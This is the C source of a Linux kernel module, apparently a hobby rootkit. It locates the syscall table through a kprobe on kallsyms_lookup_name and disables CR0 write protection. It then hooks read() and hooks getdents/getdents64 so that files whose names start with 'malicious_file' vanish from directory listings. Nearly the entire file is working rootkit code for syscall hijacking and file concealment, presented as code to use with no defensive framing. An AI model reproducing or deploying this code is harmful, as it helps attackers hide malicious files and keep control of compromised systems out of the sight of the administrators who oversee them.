#include <linux/unistd.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/kprobes.h>
#include <linux/string.h>

#include <asm/special_insns.h>
#include <uapi/asm/processor-flags.h>

// Ajout getdent
#include <linux/sched.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/proc_ns.h>
#include <linux/fdtable.h>
#ifndef __NR_getdents
#define __NR_getdents 141
#endif
#define MAGIC_PREFIX "malicious_file"

#include "hooking.h"

// Function pointer for read
typedef int (*sysfun_t)(struct pt_regs *);
sysfun_t old_read;

// Function pointer for kallsyms_lookup_name
typedef void *(*kallsyms_t)(const char *);
kallsyms_t lookup_name;

// Pointer to syscall table
unsigned long *syscall_table = 0;

// cr0 status
unsigned long cr0;

int new_read(struct pt_regs *regs)
{
  int fd = (int)regs->di;
  void *buf = (void *)regs->si;
  size_t count = (size_t)regs->dx;

  int retval;
  if (fd == 2600)
  {
    printk(KERN_INFO "Read was called with file descriptor 2600, doing something else.");
    printk(KERN_INFO "Something else");
    return 0;
  }

  retval = old_read(regs);

  return retval;
}

void cr0_write(unsigned long val)
{
  asm volatile("mov %0,%%cr0"
               : "+r"(val)
               :
               : "memory");
}

unsigned long unprotect_memory(void)
{
  unsigned long cr0;
  unsigned long newcr0;

  cr0 = native_read_cr0();
  newcr0 = cr0 & ~(X86_CR0_WP);
  cr0_write(newcr0);
  return cr0;
}

void protect_memory(unsigned long val)
{
  cr0_write(val);
}

void get_kallsyms_funcptr(void)
{
  // declare what we need to find
  struct kprobe probe = {
      .symbol_name = "kallsyms_lookup_name"};

  if (register_kprobe(&probe))
  {
    printk(KERN_ERR "Huge fuck up, couldn't find kallsyms blah blah");
  }

  lookup_name = (kallsyms_t)(probe.addr);
  unregister_kprobe(&probe);

  printk(KERN_INFO "kallsyms_lookup_name @ %p\n", lookup_name);
}

void get_syscall_table(void)
{
  syscall_table = (long unsigned int *)lookup_name("sys_call_table");
  if (!syscall_table)
  {
    printk(KERN_ERR "Couldn't find syscall table");
    return;
  }
  printk(KERN_INFO "Found syscall table @ %p", syscall_table);
}

void hijack_read(void)
{
  unsigned long old_cr0 = unprotect_memory();

  old_read = (sysfun_t)syscall_table[__NR_read];
  printk(KERN_INFO "Old read @ %p", old_read);

  syscall_table[__NR_read] = (uint64_t)new_read;
  printk(KERN_INFO "Hooked read(), new read @ %p", &syscall_table[__NR_read]);
  protect_memory(old_cr0);
}

// For Getdents
// hooks the getdents64 syscall using the syscall table modification method to hide files named "malicious_file"(MAGIC_PREFIX)
struct linux_dirent
{
  unsigned long d_ino;
  unsigned long d_off;
  unsigned short d_reclen;
  char d_name[1];
};
sysfun_t orig_getdents;
sysfun_t orig_getdents64;

static long hacked_getdents64(const struct pt_regs *pt_regs)
{
  struct linux_dirent *dirent = (struct linux_dirent *)pt_regs->si;
  int ret = orig_getdents64(pt_regs), err;
  unsigned long off = 0;
  struct linux_dirent64 *dir, *kdirent, *prev = NULL;
  if (ret <= 0)
    return ret;
  kdirent = kzalloc(ret, GFP_KERNEL);
  if (kdirent == NULL)
    return ret;
  err = copy_from_user(kdirent, dirent, ret);
  if (err)
    goto out;
  while (off < ret)
  {
    dir = (void *)kdirent + off;
    if (memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0)
    {
      if (dir == kdirent)
      {
        ret -= dir->d_reclen;
        memmove(dir, (void *)dir + dir->d_reclen, ret);
        continue;
      }
      prev->d_reclen += dir->d_reclen;
    }
    else
      prev = dir;
    off += dir->d_reclen;
  }
  err = copy_to_user(dirent, kdirent, ret);
  if (err)
    goto out;
out:
  kfree(kdirent);
  return ret;
}

static long hacked_getdents(const struct pt_regs *pt_regs)
{
  struct linux_dirent *dirent = (struct linux_dirent *)pt_regs->si;
  int ret = orig_getdents(pt_regs), err;
  unsigned long off = 0;
  struct linux_dirent *dir, *kdirent, *prev = NULL;
  if (ret <= 0)
    return ret;
  kdirent = kzalloc(ret, GFP_KERNEL);
  if (kdirent == NULL)
    return ret;
  err = copy_from_user(kdirent, dirent, ret);
  if (err)
    goto out;
  while (off < ret)
  {
    dir = (void *)kdirent + off;
    if (memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0)
    {
      if (dir == kdirent)
      {
        ret -= dir->d_reclen;
        memmove(dir, (void *)dir + dir->d_reclen, ret);
        continue;
      }
      prev->d_reclen += dir->d_reclen;
    }
    else
      prev = dir;
    off += dir->d_reclen;
  }
  err = copy_to_user(dirent, kdirent, ret);
  if (err)
    goto out;
out:
  kfree(kdirent);
  return ret;
}

void replace_getdents(void)
{
  unsigned long old_cr0 = unprotect_memory();

  orig_getdents = (sysfun_t)syscall_table[__NR_getdents];
  orig_getdents64 = (sysfun_t)syscall_table[__NR_getdents64];
  printk(KERN_INFO "orig_getdents @ %p", orig_getdents);
  printk(KERN_INFO "orig_getdents64 @ %p", orig_getdents64);

  syscall_table[__NR_getdents] = (uint64_t)hacked_getdents;
  syscall_table[__NR_getdents64] = (uint64_t)hacked_getdents64;
  printk(KERN_INFO "Hooked getdents(), new getdents @ %p", &syscall_table[__NR_getdents]);
  printk(KERN_INFO "Hooked getdents64(), new getdents64 @ %p", &syscall_table[__NR_getdents64]);
  protect_memory(old_cr0);
}

void clear_getdents(void)
{

  unsigned long old_cr0 = unprotect_memory();

  syscall_table[__NR_getdents] = (unsigned long)orig_getdents;
  syscall_table[__NR_getdents64] = (unsigned long)orig_getdents64;

  protect_memory(old_cr0);
}
